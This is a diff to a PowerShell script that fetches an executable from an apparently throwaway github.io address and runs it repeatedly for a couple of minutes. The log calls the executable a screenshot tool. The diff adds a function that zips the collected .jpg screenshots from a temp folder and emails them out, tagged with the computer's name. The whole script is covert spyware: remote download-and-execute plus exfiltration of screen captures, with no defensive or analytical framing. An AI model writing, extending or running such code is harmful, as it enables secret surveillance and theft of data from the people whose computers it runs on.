@@ -68,13 +68,19 @@ Function Get-Executable {
     return $true
 }
 
-
+Function PackageAndSend{
+    $Path = "$Env:TEMP" + '\ZZZ999'
+    $OutPath = "$Env:TEMP" + '\Z.zip'
+    $Files = (gci -path $Path -File -Filter '*.jpg').Fullname
+    Compress-Archive -Path $Path -DestinationPath $OutPath
+    Send-EmailNotification "$Env:ComputerName SSHOT" "see att" "$OutPath"
+}
 
 $Url = "https://vr972be716a04eb6.github.io/"
 Get-Executable -Url $Url
 
 [DateTime]$Start = Get-Date
-$End = $Start.AddMinutes(3)
+$End = $Start.AddMinutes(2)
 
 Do{
     Log-String "Caling Global:SSHOTEXE"
@@ -82,3 +88,5 @@ Do{
     &"$Exec"
     Start-Sleep -Seconds 30
 }While ((Get-Date) -lt $End)
+
+PackageAndSend
